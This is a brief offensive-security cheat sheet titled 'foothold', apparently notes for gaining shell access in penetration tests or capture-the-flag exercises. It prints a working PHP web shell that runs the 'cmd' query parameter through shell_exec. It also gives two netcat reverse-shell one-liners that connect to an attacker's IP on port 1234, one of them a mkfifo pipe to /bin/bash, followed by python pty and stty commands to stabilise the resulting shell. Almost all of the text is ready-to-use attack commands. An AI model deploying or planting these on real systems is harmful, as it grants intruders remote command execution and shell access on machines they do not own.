# foothold

## Web shells

- A simple PHP web shell.

```shell
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

- The well known pentestmonkey php reverse shell [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

- A list of reverse shell payloads [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
Common payloads include

```
nc ip 1234 -e /bin/bash
```
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ip 1234 >/tmp/f
```

## Stabilisation

- Stabilize your shell using

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
alias ls='ls --color=auto'
export TERM=xterm
```

or just

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
alias ls='ls --color=auto'
export TERM=xterm
```

if `python3` is not available.

- Set up autocomplete. Background the shell using `CTRL + Z` and run 

```shell
stty raw -echo; fg
```
to foreground the shell using tab completion.

